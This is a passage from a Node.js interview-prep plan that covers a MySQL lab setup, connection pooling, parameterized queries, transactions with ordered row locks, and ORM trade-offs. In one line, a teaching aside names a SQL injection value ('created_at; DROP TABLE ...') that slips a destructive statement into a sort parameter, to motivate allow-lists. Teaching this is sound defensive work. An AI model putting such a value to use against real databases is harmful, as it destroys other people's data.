# Week 5 -- Backend Data Access, MongoDB, Authentication and Security

Days 29-35 of the 56-day plan. About 2 hours per day, 14 hours total.

This week is where "I can build an Express API" becomes "I can build an API that survives real users and real attackers". Interviewers for junior-to-mid backend roles spend a large share of the interview on exactly this material: how you talk to the database, how you store passwords, how login works, and how you stop common attacks.

## Contents of this file

- Tier legend and how to read this file
- Week 5 lab setup (shared by all days)
- Day 1 - Node.js to MySQL (mysql2), pooling, transactions in code, ORM vs raw SQL
- Day 2 - MongoDB (official driver): documents, collections, indexes, aggregation, SQL vs NoSQL
- Day 3 - Signup/login APIs, bcrypt, JWT structure and verification
- Day 4 - Access/refresh tokens, sessions vs JWT, authentication vs authorization, RBAC
- Day 5 - SQL injection, XSS, CSRF, CORS, rate limiting (and helmet)
- Day 6 - Secure configuration, secrets management, common production security mistakes
- Day 7 - Revision, security audit lab, weekly test
- Week 5 revision summary
- Week 5 assessment (Basic / Intermediate / Advanced)
- Answers with explanations
- Weak-area identification guidance
- Catch-up plan if you fell behind

## Tier legend

- `[ESSENTIAL]` -- asked in most junior-to-mid backend interviews. Learn these properly.
- `[ADVANCED]` -- supplementary. Read if time permits; do not panic if you skip it in the first pass.

Honest note: security is a huge field. One week gives you the interview-level foundation (the OWASP-style basics and the patterns every backend team uses). It does not make you a security engineer. Where something is deliberately simplified, the text says so.

## Cross-references used in this week

- Question bank: `Q-SEC-xx` (Auth/security), `Q-SQL-xx`, `Q-MONGO-xx` in files 09 and 10.
- Coding exercises: `EX-JWT-01..`, `EX-TXN-01..`, `EX-MW-01..`, `EX-RATE-01..` in file 11.
- Project: Stage 3 (MySQL data layer), Stage 4 (auth + RBAC), Stage 5 (transactions) in file 12.
- Earlier weeks: Week 4 / Day 4 and Day 5 notes (transactions, locking, pooling concepts), Week 2 / Day 2 notes (thread pool), Week 3 / Day 3 and Day 4 notes (middleware, error handling), Week 3 / Day 6 notes (CORS debugging).

---

## Week 5 lab setup (shared by all days)

Saari examples ek hi chhota lab project use karti hain taaki har din naya setup na karna pade. Ye setup ek baar karo.

### Requirements

- Node.js 22 LTS (Node 20.6+ also works for everything here; version-specific points are flagged).
- MySQL 8 running locally (Docker or installed).
- MongoDB 7 or 8 running locally (needed from Day 2). For transaction examples it must run as a replica set; a single-node replica set is enough for learning.

### Folder layout

```text
week5-lab/
  package.json
  .env                 (NEVER commit; see Day 6)
  .env.example         (commit this; no real secrets)
  .gitignore
  sql/schema.sql
  src/
    config.js          (Day 1 stub, hardened on Day 6)
    errors.js          (AppError + central error handler)
    app.js             (assembled on Day 6)
    server.js
    db/mysql.js        (pool + withTransaction)
    db/mongo.js        (Day 2)
    services/accounts.js
    services/password.js
    services/tokens.js
    services/refreshTokens.js
    middleware/authenticate.js
    middleware/rbac.js
    middleware/security.js
    routes/auth.js
    routes/accounts.js
    routes/admin.js
```

### package.json

```json
{
  "name": "week5-lab",
  "version": "1.0.0",
  "private": true,
  "type": "module",
  "engines": { "node": ">=20.6.0" },
  "scripts": {
    "start": "node --env-file=.env src/server.js",
    "dev": "node --watch --env-file=.env src/server.js"
  }
}
```

Install dependencies (latest majors at the time you read this; check each changelog if something differs from the notes):

```bash
npm install express mysql2 mongodb bcrypt jsonwebtoken helmet express-rate-limit cookie-parser cors zod
```

Notes:

- Express 5 is the current major. In Express 5, a rejected promise or thrown error inside an `async` handler is forwarded to the error-handling middleware automatically. In Express 4 you needed a wrapper (`express-async-errors` or try/catch + `next(err)`).
- `--env-file` is built into Node 20.6+. No `dotenv` package needed (details on Day 6).

### sql/schema.sql (MySQL 8)

```sql
CREATE DATABASE IF NOT EXISTS week5
  CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
USE week5;

CREATE TABLE users (
  id            BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  email         VARCHAR(254)    NOT NULL,
  password_hash VARCHAR(255)    NOT NULL,
  role          ENUM('user', 'manager', 'admin') NOT NULL DEFAULT 'user',
  created_at    TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_users_email (email)
) ENGINE=InnoDB;

CREATE TABLE accounts (
  id         BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  user_id    BIGINT UNSIGNED NOT NULL,
  balance    DECIMAL(12,2)   NOT NULL DEFAULT 0.00,
  created_at TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_accounts_user (user_id),
  CONSTRAINT fk_accounts_user FOREIGN KEY (user_id) REFERENCES users (id),
  CONSTRAINT chk_accounts_balance CHECK (balance >= 0)
) ENGINE=InnoDB;

CREATE TABLE transfers (
  id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  from_account_id BIGINT UNSIGNED NOT NULL,
  to_account_id   BIGINT UNSIGNED NOT NULL,
  amount          DECIMAL(12,2)   NOT NULL,
  created_at      TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  CONSTRAINT fk_tr_from FOREIGN KEY (from_account_id) REFERENCES accounts (id),
  CONSTRAINT fk_tr_to   FOREIGN KEY (to_account_id)   REFERENCES accounts (id),
  CONSTRAINT chk_tr_amount CHECK (amount > 0)
) ENGINE=InnoDB;

CREATE TABLE refresh_tokens (
  id             BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
  user_id        BIGINT UNSIGNED NOT NULL,
  family_id      CHAR(36)        NOT NULL,
  token_hash     CHAR(64)        NOT NULL,
  expires_at     DATETIME        NOT NULL,
  revoked_at     DATETIME        NULL,
  replaced_by_id BIGINT UNSIGNED NULL,
  created_at     TIMESTAMP       NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_rt_token_hash (token_hash),
  KEY idx_rt_family (family_id),
  KEY idx_rt_user (user_id),
  CONSTRAINT fk_rt_user FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
) ENGINE=InnoDB;
```

Design notes (interviewers love these):

- `balance DECIMAL(12,2)` -- money kabhi `FLOAT`/`DOUBLE` mein store mat karo (binary floating point rounding errors).
- `CHECK (balance >= 0)` is enforced in MySQL 8.0.16+. A database constraint is the last line of defence even if the app has a bug.
- `refresh_tokens.token_hash` stores a hash, never the raw token (explained on Day 4).

### .env.example

```ini
NODE_ENV=development
PORT=3000

DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=week5_app
DB_PASSWORD=change-me-locally
DB_NAME=week5

MONGODB_URI=mongodb://127.0.0.1:27017/?replicaSet=rs0

JWT_ACCESS_SECRET=replace-with-at-least-32-random-bytes-in-hex
JWT_ISSUER=week5-lab
JWT_AUDIENCE=week5-lab-clients

CORS_ORIGINS=http://localhost:5173
BCRYPT_COST=12
```

Generate a real secret locally:

```bash
node -e "console.log(require('node:crypto').randomBytes(48).toString('hex'))"
```

(This one-liner uses `require` only because `node -e` runs as CommonJS by default; all lab files use ESM.)

### src/errors.js (shared helper, used all week)

```js
// src/errors.js
export class AppError extends Error {
  constructor(status, message, code) {
    super(message);
    this.name = 'AppError';
    this.status = status;
    this.code = code;
  }
}

// Central error handler (see Week 3 / Day 4 notes). Day 6 explains why the 500 branch hides details.
export function errorHandler(err, req, res, next) {
  if (res.headersSent) return next(err);

  const status = err.status ?? err.statusCode ?? 500;
  if (status >= 500) {
    console.error(err); // real apps: structured logger (Week 6)
  }

  res.status(status).json({
    error: {
      code: err.code ?? (status >= 500 ? 'INTERNAL_ERROR' : 'REQUEST_ERROR'),
      message: status >= 500 ? 'Internal Server Error' : err.message,
    },
  });
}

export function notFound(req, res, next) {
  next(new AppError(404, 'Route not found', 'NOT_FOUND'));
}
```

### src/config.js (Day 1 stub; Day 6 replaces it with validated config)

```js
// src/config.js
function required(name) {
  const value = process.env[name];
  if (!value) throw new Error(`Missing required environment variable: ${name}`);
  return value;
}

export const config = {
  env: process.env.NODE_ENV ?? 'development',
  port: Number(process.env.PORT ?? 3000),
  db: {
    host: required('DB_HOST'),
    port: Number(process.env.DB_PORT ?? 3306),
    user: required('DB_USER'),
    password: required('DB_PASSWORD'),
    database: required('DB_NAME'),
  },
  jwt: {
    accessSecret: required('JWT_ACCESS_SECRET'),
    issuer: process.env.JWT_ISSUER ?? 'week5-lab',
    audience: process.env.JWT_AUDIENCE ?? 'week5-lab-clients',
  },
  corsOrigins: (process.env.CORS_ORIGINS ?? '').split(',').map((s) => s.trim()).filter(Boolean),
  bcryptCost: Number(process.env.BCRYPT_COST ?? 12),
};
```

---

## Day 1 - Node.js to MySQL (mysql2), pooling, transactions in code, ORM vs raw SQL

**Time plan (about 2 hours):** 25 min read pooling + query/execute, 25 min read transactions, 15 min ORM vs raw SQL, 45 min coding practice, 10 min revision questions.

**Learning objectives**

- Connect Node.js to MySQL using `mysql2/promise` and explain why we use a connection pool.
- Explain the difference between `pool.query()` and `pool.execute()` and why both are safe when placeholders are used.
- Write a correct transaction in Node (`getConnection`, `beginTransaction`, `commit`, `rollback`, `release`) and explain every line.
- Prevent lost updates and deadlocks in a money-transfer function using row locks and consistent lock ordering.
- Compare ORM, query builder and raw SQL with honest trade-offs.

### 1.1 Why a connection pool `[ESSENTIAL]`

**Concept**

Database connection banana bahut costly hota hai: TCP handshake, (often) TLS handshake, MySQL authentication, session setup. Agar har HTTP request par naya connection kholo aur band karo, toh latency badh jaati hai aur MySQL `max_connections` limit hit ho jaati hai. Pool ek fixed set of already-open connections rakhta hai. Request aati hai -> pool se connection "udhaar" leti hai -> query chalati hai -> connection wapas pool mein.

**Why it matters**

- Performance: handshake cost har request par nahi lagta.
- Protection: pool size DB ko overload hone se bachata hai (backpressure on the database).
- Interviewers often ask: "How many connections should the pool have?" and "What happens when the pool is exhausted?"

**Internal working**

- `mysql.createPool()` creates the pool object lazily; connections are opened on demand up to `connectionLimit`.
- When you call `pool.execute(sql, params)`, the pool takes an idle connection (or opens a new one if under the limit), runs the query, and returns the connection to the idle list automatically.
- If all connections are busy and `waitForConnections: true`, the request waits in a queue (`queueLimit: 0` means unlimited queue, which can hide overload; many teams set a finite `queueLimit` so overload fails fast).
- `idleTimeout` and `maxIdle` let the pool close idle connections (mysql2 3.x). MySQL itself closes connections idle for `wait_timeout` seconds (default 8 hours), which is why `enableKeepAlive` is useful behind proxies and load balancers that drop idle TCP connections.
- Each connection runs one query at a time. A pool of 10 means at most 10 queries in flight from this Node process. Node.js ka event loop single thread hai, par DB queries network I/O hain (libuv/OS polling, not the thread pool), so 10 connections can all be waiting concurrently without blocking the event loop.

**Code example**

```js
// src/db/mysql.js
import mysql from 'mysql2/promise';
import { config } from '../config.js';

export const pool = mysql.createPool({
  host: config.db.host,
  port: config.db.port,
  user: config.db.user,
  password: config.db.password,
  database: config.db.database,

  waitForConnections: true, // queue when busy instead of throwing
  connectionLimit: 10,      // max open connections from THIS process
  maxIdle: 10,              // idle connections kept open
  idleTimeout: 60_000,      // close idle connections after 60s
  queueLimit: 0,            // 0 = unlimited queue (consider a finite value in production)
  enableKeepAlive: true,
  keepAliveInitialDelay: 0,
  connectTimeout: 10_000,
  timezone: 'Z',            // treat DATETIME/TIMESTAMP as UTC in JS Dates
});

export async function checkDb() {
  const [rows] = await pool.query('SELECT 1 AS ok');
  return rows[0].ok === 1;
}

export async function closeDb() {
  await pool.end(); // waits for in-use connections to be released, then closes all
}
```

**Frontend connection**

Browser mein tum `fetch` ke liye connection reuse (HTTP keep-alive, HTTP/2 multiplexing) ka concept already use karte ho. Pool wahi idea hai DB side par: naya connection har baar nahi, reuse karo. React mein `useMemo` jaise expensive object ko ek baar banana aur reuse karna bhi similar mindset hai.

**Real-world scenario**

Marketplace sale day: traffic 10x ho gaya. Agar har instance ka pool 50 hai aur 10 instances chal rahe hain, total 500 connections MySQL par aayenge. MySQL ka default `max_connections` 151 hai, toh `Too many connections` error aayega. Isliye pool size ka calculation hamesha `(number of app instances) x connectionLimit < DB max_connections` hona chahiye.

**Interview answer:**

"A connection pool keeps a bounded set of open database connections that requests borrow and return. It avoids paying the TCP, TLS and authentication cost on every request, and it caps concurrency so one application process cannot overload the database. I size it from the database's max_connections divided by the number of app instances, leave headroom for admin and migration connections, and tune it with load tests. A bigger pool is not automatically faster; past a point it just increases lock contention on the database."

**Follow-up questions**

1. *What happens if the pool is exhausted?* With `waitForConnections: true`, new requests wait in the queue until a connection is released. If the queue is unlimited and queries are slow, latency grows without bound and requests time out upstream. Use a finite `queueLimit`, query timeouts and monitoring so overload fails fast.
2. *Why not one single shared connection?* One connection runs one query at a time (and one transaction at a time), so every request would serialize behind it, and one failing statement/transaction would affect everyone.
3. *Why is a huge pool (say 500) a bad idea?* The DB has limited CPU and I/O. More concurrent queries means more context switching and lock contention, and N instances multiply the total. Throughput usually peaks at a modest pool size.
4. *Does the pool use the libuv thread pool?* No. mysql2 talks over a TCP socket, which libuv handles with OS-level polling (epoll/kqueue/IOCP). See Week 2 / Day 2 notes.

**Common mistakes**

- Creating a new pool (or connection) inside each request handler. Pool must be created once at startup and shared.
- Forgetting to release a manually acquired connection (see 1.3). This slowly leaks connections until the app hangs.
- Setting `connectionLimit` without thinking about number of instances.
- Not handling `pool.end()` on shutdown (Week 6 / Day 5 covers graceful shutdown).

**Revision notes**

- One pool per process, created at startup.
- Pool size x instances < MySQL `max_connections`.
- Pool use network I/O, not the libuv thread pool.
- Finite queue + timeouts = fail fast instead of silently piling up.

### 1.2 `query()` vs `execute()` and placeholders `[ESSENTIAL]`

**Concept**

`mysql2` gives two ways to run SQL with parameters:

- `pool.query(sql, values)` -- the driver substitutes `?` with escaped values on the client, then sends one finished SQL text to MySQL.
- `pool.execute(sql, values)` -- a real server-side prepared statement. Driver sends SQL with `?` placeholders (PREPARE), then sends values separately in a binary protocol (EXECUTE). MySQL never parses user data as SQL.

**Why it matters**

Ye SQL injection ka direct defence hai (Day 5 shows the attack). Interviewers ask this very often: "Is `query()` safe?" The correct answer: both are safe when you pass values through `?` placeholders; both are unsafe if you concatenate strings yourself.

**Internal working**

- `execute()` costs an extra round trip the first time (PREPARE), but the driver caches prepared statements per connection (an LRU cache), so repeated queries skip the PREPARE step.
- `query()` is one round trip and supports `IN (?)` with an array (the driver expands it). `execute()` does not expand arrays; you must generate placeholders yourself.
- Both return `[rows, fields]` for SELECT and `[ResultSetHeader, undefined]` for INSERT/UPDATE/DELETE. `ResultSetHeader` has `insertId`, `affectedRows`, `changedRows`.

**Code example**

```js
// src/services/users.js
import { pool } from '../db/mysql.js';

export async function findUserById(id) {
  const [rows] = await pool.execute(
    'SELECT id, email, role, created_at FROM users WHERE id = ?',
    [id],
  );
  return rows[0] ?? null;
}

export async function createUser({ email, passwordHash }) {
  const [result] = await pool.execute(
    'INSERT INTO users (email, password_hash) VALUES (?, ?)',
    [email, passwordHash],
  );
  return result.insertId;
}

// IN list with execute(): build the placeholders, still never concatenate values
export async function findUsersByIds(ids) {
  if (ids.length === 0) return [];
  const placeholders = ids.map(() => '?').join(', ');
  const [rows] = await pool.execute(
    `SELECT id, email, role FROM users WHERE id IN (${placeholders})`,
    ids,
  );
  return rows;
}

// Dynamic ORDER BY: identifiers cannot be placeholders, so use an allow-list
const SORTABLE = { created: 'created_at', email: 'email' };
export async function listUsers({ sort = 'created', dir = 'desc', limit = 20, offset = 0 }) {
  const column = SORTABLE[sort] ?? SORTABLE.created;       // allow-list lookup
  const direction = dir === 'asc' ? 'ASC' : 'DESC';         // two fixed choices
  const safeLimit = Math.min(Math.max(Number(limit) | 0, 1), 100);
  const safeOffset = Math.max(Number(offset) | 0, 0);

  // pool.query() here: see the LIMIT note below
  const [rows] = await pool.query(
    `SELECT id, email, role, created_at FROM users ORDER BY ${column} ${direction} LIMIT ? OFFSET ?`,
    [safeLimit, safeOffset],
  );
  return rows;
}
```

Version-dependent gotcha (flagged): with MySQL 8.0.22+ some `mysql2` versions throw `Incorrect arguments to mysqld_stmt_execute` when you pass JS numbers for `LIMIT ?` / `OFFSET ?` through `execute()`, because numbers may be sent as DOUBLE in the binary protocol. The simple fix is to use `pool.query()` for those statements with values you have already validated as integers (as above). The column and direction in the string come from an allow-list, never from raw user input.

**Frontend connection**

React mein JSX `{userInput}` automatically escape hota hai, aur `dangerouslySetInnerHTML` dangerous hai. SQL placeholders ka concept bilkul same hai: data ko code se alag rakho. `?` placeholder = JSX expression; string concatenation = `dangerouslySetInnerHTML`.

**Real-world scenario**

Payments dashboard: "Show transactions for merchant X, sorted by user-selected column". Merchant id placeholder se jaata hai. Sort column allow-list se. Agar sort column direct `req.query.sort` se concat karo, attacker `created_at; DROP TABLE ...` ya subquery inject kar sakta hai (Day 5 NEVER DO section).

**Interview answer:**

"Both query() and execute() are safe against SQL injection as long as values are passed as parameters. query() escapes values on the client and sends one SQL string; execute() uses a real server-side prepared statement, so the SQL structure and the data travel separately and the data can never change the structure. I prefer execute() for hot, repeated queries because statements are cached per connection, and I use an allow-list for anything that cannot be a parameter, such as column names in ORDER BY."

**Follow-up questions**

1. *Can you parameterize table or column names?* No. Placeholders only stand for values. Identifiers must come from an allow-list or a mapping you control.
2. *Does `execute()` make a stored XSS or logic bug safe?* No. It only protects the SQL layer.
3. *What does `affectedRows` vs `changedRows` mean?* `affectedRows` counts rows matched (by default for UPDATE it is rows matched, depending on the client flags), `changedRows` counts rows whose value actually changed. Check `affectedRows` to detect "no such row".
4. *Why does the app still need a `UNIQUE` index on email if we check for existing users first?* Because check-then-insert is a race condition; two requests can both pass the check. The unique index is the real guarantee; handle `ER_DUP_ENTRY`.

**Common mistakes**

- Template-literal SQL with user data: `` `... WHERE id = ${id}` `` (NEVER DO; shown on Day 5).
- Building `IN (...)` lists by joining raw values.
- `SELECT *` returning `password_hash` to the client by mistake. Select explicit columns.
- Trusting `typeof id === 'number'` instead of validating input at the boundary.

**Revision notes**

- `?` placeholders for values; allow-list for identifiers.
- `execute` = real prepared statement; `query` = client-side escaping; both safe with `?`.
- `LIMIT ?` through `execute` can fail on some versions; use `query` with validated integers.
- Return only columns you need.

### 1.3 Transactions in Node code `[ESSENTIAL]`

**Concept**

Transaction = multiple SQL statements as one all-or-nothing unit (ACID, covered in Week 4 / Day 4 notes). In Node, the trap is that `pool.execute()` may pick a *different* connection for each call, so `BEGIN` on one connection and `UPDATE` on another is not a transaction at all. For a transaction you must check out one connection and run every statement on it.

**Why it matters**

Money transfer, order placement (insert order + decrement stock + create payment record), seat booking -- all need atomicity. "Explain how you would implement a bank transfer safely" is a classic interview question.

**Internal working**

1. `pool.getConnection()` removes one connection from the pool for exclusive use.
2. `beginTransaction()` sends `START TRANSACTION` on that connection.
3. Statements run on that same connection. `SELECT ... FOR UPDATE` takes row locks (InnoDB) that other transactions must wait for.
4. `commit()` makes changes durable and releases locks. `rollback()` undoes everything and releases locks.
5. `release()` returns the connection to the pool. It must run on every path, so it goes in `finally`.

Deadlocks: two transactions lock rows in opposite order and wait for each other. InnoDB detects this and kills one with error `ER_LOCK_DEADLOCK` (errno 1213). Prevention: always lock rows in a consistent order (for example by ascending id). Remedy: retry the whole transaction a few times.

**Code example**

```js
// src/db/mysql.js (append)
export async function withTransaction(work) {
  const conn = await pool.getConnection();
  try {
    await conn.beginTransaction();
    const result = await work(conn);
    await conn.commit();
    return result;
  } catch (err) {
    try {
      await conn.rollback();
    } catch (rollbackErr) {
      console.error('Rollback failed', rollbackErr);
    }
    throw err;
  } finally {
    conn.release(); // ALWAYS, on success and on failure
  }
}

// Retry only for transient concurrency errors, with a small back-off
export async function withRetry(fn, { attempts = 3 } = {}) {
  for (let i = 1; ; i++) {
    try {
      return await fn();
    } catch (err) {
      const transient = err.code === 'ER_LOCK_DEADLOCK' || err.code === 'ER_LOCK_WAIT_TIMEOUT';
      if (!transient || i >= attempts) throw err;
      await new Promise((r) => setTimeout(r, 50 * 2 ** i));
    }
  }
}
```

```js
// src/services/accounts.js
import { withTransaction, withRetry } from '../db/mysql.js';
import { AppError } from '../errors.js';

// amount is a validated decimal string such as "250.00" (never a JS float)
export function transferMoney({ fromAccountId, toAccountId, amount }) {
  if (fromAccountId === toAccountId) {
    throw new AppError(400, 'Cannot transfer to the same account', 'SAME_ACCOUNT');
  }

  return withRetry(() =>
    withTransaction(async (conn) => {
      // 1. Lock BOTH rows in ascending id order -> consistent order prevents deadlocks
      const [first, second] =
        fromAccountId < toAccountId ? [fromAccountId, toAccountId] : [toAccountId, fromAccountId];

      const [locked] = await conn.execute(
        'SELECT id FROM accounts WHERE id IN (?, ?) ORDER BY id FOR UPDATE',
        [first, second],
      );
      if (locked.length !== 2) {
        throw new AppError(404, 'Account not found', 'ACCOUNT_NOT_FOUND');
      }

      // 2. Guarded debit: the WHERE clause is the business rule, evaluated atomically
      const [debit] = await conn.execute(
        'UPDATE accounts SET balance = balance - ? WHERE id = ? AND balance >= ?',
        [amount, fromAccountId, amount],
      );
      if (debit.affectedRows !== 1) {
        throw new AppError(422, 'Insufficient funds', 'INSUFFICIENT_FUNDS');
      }

      // 3. Credit
      await conn.execute(
        'UPDATE accounts SET balance = balance + ? WHERE id = ?',
        [amount, toAccountId],
      );

      // 4. Audit row
      const [ins] = await conn.execute(
        'INSERT INTO transfers (from_account_id, to_account_id, amount) VALUES (?, ?, ?)',
        [fromAccountId, toAccountId, amount],
      );
      return { transferId: ins.insertId };
    }),
  );
}
```

Important design point: the check "enough balance?" is inside the `UPDATE ... WHERE balance >= ?`, not a separate `SELECT` followed by an `UPDATE` in JavaScript. A separate read-then-write has a gap in which another request can change the balance (lost update / write skew). The guarded UPDATE closes the gap, and the `FOR UPDATE` lock plus consistent ordering protects the multi-row operation.

Throwing inside `work()` triggers rollback, so a failed credit undoes the debit. That is exactly the "all or nothing" guarantee.

**Frontend connection**

Think of `useReducer` / optimistic update: you apply several state changes, and if the server rejects, you roll back all of them to a snapshot. A DB transaction gives the same all-or-nothing behavior, but with real concurrency guarantees from the database engine.

**Real-world scenario**

Banking/wallet app: user A sends 500 to user B while user B simultaneously sends 200 to user A. Without ordered locking these two transactions can deadlock. With ordered `FOR UPDATE` they queue one after another, and the retry wrapper handles the rare deadlock that still occurs from other statements.

**Interview answer:**

"In Node I check out a single connection from the pool, begin a transaction, run all statements on that same connection, and commit; on any error I roll back, and in a finally block I always release the connection. For a transfer I lock both account rows with SELECT ... FOR UPDATE in a consistent order, apply a guarded UPDATE so the balance check and the debit are one atomic statement, write an audit row, and retry the whole transaction on a deadlock error. I also keep a CHECK constraint on the balance so the database rejects bad states even if the application has a bug."

**Follow-up questions**

1. *Why must `release()` be in `finally`?* An exception between acquire and release would otherwise leak the connection. After `connectionLimit` leaks the pool is exhausted and the whole service hangs.
2. *Why not call `pool.execute('START TRANSACTION')`?* The pool may route each call to a different connection, so BEGIN, UPDATE and COMMIT would run on different sessions.
3. *What is a deadlock and how do you handle it?* Two transactions hold locks the other needs. InnoDB aborts one (errno 1213). Prevent with consistent lock ordering and short transactions; handle by retrying the transaction.
4. *Which isolation level does InnoDB use by default?* REPEATABLE READ (see Week 4 / Day 4 notes). Locking reads like `FOR UPDATE` read the latest committed data and lock it.
5. *Is it OK to call an external payment API inside the DB transaction?* Avoid it. The transaction holds locks while waiting on a slow network call. Use a state machine plus idempotency (Week 6 / Day 3, Week 7 / Day 4).

**Common mistakes**

- Using `pool.execute` for statements that must be part of the transaction.
- Not releasing the connection when an error is thrown.
- Read-then-write in JS (`SELECT balance` ... `if (balance >= amount)` ... `UPDATE`) without a lock.
- Using JS `Number` for money (floating point). Use `DECIMAL` and strings (or integer minor units such as paise).
- Doing slow work (HTTP calls, file I/O, sleeps) inside a transaction.
- Retrying non-idempotent work outside a transaction boundary.

**Revision notes**

- One connection per transaction: `getConnection` -> `beginTransaction` -> work -> `commit`/`rollback` -> `release` in `finally`.
- Lock in consistent order; keep transactions short; retry on deadlock.
- Put the business rule into the guarded `UPDATE ... WHERE`.
- `DECIMAL` for money, DB constraints as a safety net.

### 1.4 ORM vs query builder vs raw SQL `[ESSENTIAL]`

**Concept**

- *Raw SQL driver* (mysql2): you write SQL; you get arrays/objects back.
- *Query builder* (Knex, Kysely): you build SQL with a JS API, still close to SQL, and still parameterized.
- *ORM* (Sequelize, TypeORM, Prisma, Drizzle, MikroORM): you work with models/entities; the tool generates SQL, manages migrations and (often) types.

**Why it matters**

"ORM ya raw SQL?" is an extremely common interview question. The honest answer is "it depends", and you must show that you know what it depends on.

**Internal working**

An ORM translates method calls into SQL (still using parameters), maps rows to objects, and often adds change tracking, relation loading and migrations. The hidden cost: generated SQL may be inefficient (N+1 queries when lazily loading relations), and complex reports can be awkward.

**Code example** (same query three ways; the ORM versions are illustrative, you do not need to install them this week)

```js
// Raw SQL (mysql2)
const [rows] = await pool.execute(
  `SELECT u.id, u.email, COUNT(a.id) AS account_count
   FROM users u
   LEFT JOIN accounts a ON a.user_id = u.id
   WHERE u.role = ?
   GROUP BY u.id, u.email`,
  ['user'],
);

// Query builder style (Knex-like, illustrative)
// const rows = await knex('users as u')
//   .leftJoin('accounts as a', 'a.user_id', 'u.id')
//   .where('u.role', 'user')
//   .groupBy('u.id', 'u.email')
//   .select('u.id', 'u.email')
//   .count({ account_count: 'a.id' });

// ORM style (Prisma-like, illustrative)
// const users = await prisma.user.findMany({
//   where: { role: 'user' },
//   select: { id: true, email: true, _count: { select: { accounts: true } } },
// });
```

| Aspect | Raw SQL (mysql2) | Query builder | ORM |
|---|---|---|---|
| Control over SQL | Full | High | Limited (escape hatches exist) |
| Productivity for CRUD | Lower | Medium | High |
| Migrations / schema tooling | Separate tool | Often included | Usually included |
| Type safety | Manual | Good (Kysely) | Good (Prisma, Drizzle) |
| Complex reports / tuning | Easiest | Good | Often drops to raw SQL |
| Risk | SQL injection if you concatenate | Raw fragments can be unsafe | N+1 queries, hidden cost, raw fragments |
| Learning curve | SQL knowledge needed | SQL + API | ORM API + SQL needed anyway to debug |

**Frontend connection**

Raw SQL vs ORM is like writing DOM code by hand vs using React: abstraction increases productivity, but when something is slow you still need to understand what happens underneath (the DOM, or the SQL).

**Real-world scenario**

A startup admin panel with 40 simple CRUD tables: ORM saves weeks. A payments reconciliation job joining five tables with window functions: raw SQL is clearer and easier to optimize with `EXPLAIN`. Many mature teams use an ORM or query builder for CRUD and raw SQL for reports and hot paths.

**Interview answer:**

"I treat it as a trade-off. An ORM or query builder speeds up standard CRUD, gives migrations and types, and keeps queries parameterized by default. Raw SQL gives me full control for complex reporting and performance tuning. Regardless of the tool I must understand the SQL it generates, watch for N+1 queries, and use transactions explicitly. In this project I use mysql2 directly so I can reason about every query, and in a larger team I would consider Prisma or Drizzle for productivity."

**Follow-up questions**

1. *What is the N+1 problem?* One query loads N parent rows, then N more queries load each parent's children. Fix with a join, a batched `WHERE parent_id IN (...)`, or the ORM's eager-loading option.
2. *Is an ORM automatically safe from SQL injection?* Normal ORM APIs are parameterized, but raw-query escape hatches (`sequelize.query`, `$queryRawUnsafe`, `knex.raw` with interpolated strings) are as dangerous as concatenation.
3. *When would you not use an ORM?* Bulk operations, complex analytical queries, and strict latency paths where you need to hand-tune the SQL.
4. *Do ORMs remove the need to know SQL?* No. You still need indexes, joins, transactions and `EXPLAIN` knowledge.

**Common mistakes**

- Choosing the tool by popularity without understanding the generated SQL.
- Lazy loading relations in loops (N+1).
- Using `$queryRawUnsafe`-style APIs with user input.
- Believing the ORM makes transactions "automatic". Concurrency is still your design problem.

**Revision notes**

- ORM = productivity + hidden cost; raw SQL = control + more code; query builder = middle path.
- All are safe only if values are parameterized.
- N+1 is the classic ORM performance trap.

### 1.5 Route example: put it together

```js
// src/routes/accounts.js (Day 4 adds authentication and ownership checks)
import { Router } from 'express';
import { z } from 'zod';
import { transferMoney } from '../services/accounts.js';

export const accountsRouter = Router();

const transferSchema = z.object({
  fromAccountId: z.number().int().positive(),
  toAccountId: z.number().int().positive(),
  amount: z.string().regex(/^\d{1,10}\.\d{2}$/, 'amount must look like 250.00'),
}).strict();

accountsRouter.post('/transfers', async (req, res) => {
  const input = transferSchema.parse(req.body); // ZodError handled in errorHandler by Day 6 version
  const result = await transferMoney(input);
  res.status(201).json(result);
});
```

Express 5 forwards the rejected promise to `errorHandler`; no try/catch needed.

### Day 1 wrap-up

**Key concepts to remember**

- One pool per process; pool size x instances must stay below MySQL `max_connections`.
- `?` placeholders for values, allow-lists for identifiers; `execute` is a real prepared statement, `query` escapes client-side.
- Transaction = one checked-out connection, commit/rollback, `release()` in `finally`.
- Guarded `UPDATE ... WHERE balance >= ?` plus `FOR UPDATE` in consistent order; retry on deadlock.
- ORM vs raw SQL is a trade-off, not a religion; understand the SQL either way.

**Five revision questions**

1. Why can't you run a transaction with `pool.execute()` calls only?
2. What is the difference between `pool.query()` and `pool.execute()`, and are both safe?
3. How do you prevent two opposite transfers from deadlocking?
4. Why should money be `DECIMAL` and not `FLOAT`?
5. Give two situations where you prefer raw SQL over an ORM.

**One practical coding task**

Implement `POST /orders` for the lab: in one transaction insert into an `orders` table, decrement `products.stock` using a guarded `UPDATE ... WHERE stock >= ?`, and roll back if any item is out of stock. (Add the two tables yourself first.) Then fire 20 concurrent requests with a small script and verify stock never goes negative. This maps to `EX-TXN-01` and project Stage 5.

**Self-assessment checklist**

- [ ] I can explain why a pool exists and how I would size it.
- [ ] I can write `withTransaction` from memory and explain each line.
- [ ] I can explain why the balance check lives inside the `UPDATE`.
- [ ] I know how to handle `ER_DUP_ENTRY` and `ER_LOCK_DEADLOCK`.
- [ ] I can give a balanced ORM vs raw SQL answer.

---

## Day 2 - MongoDB (official driver): documents, collections, indexes, aggregation, SQL vs NoSQL

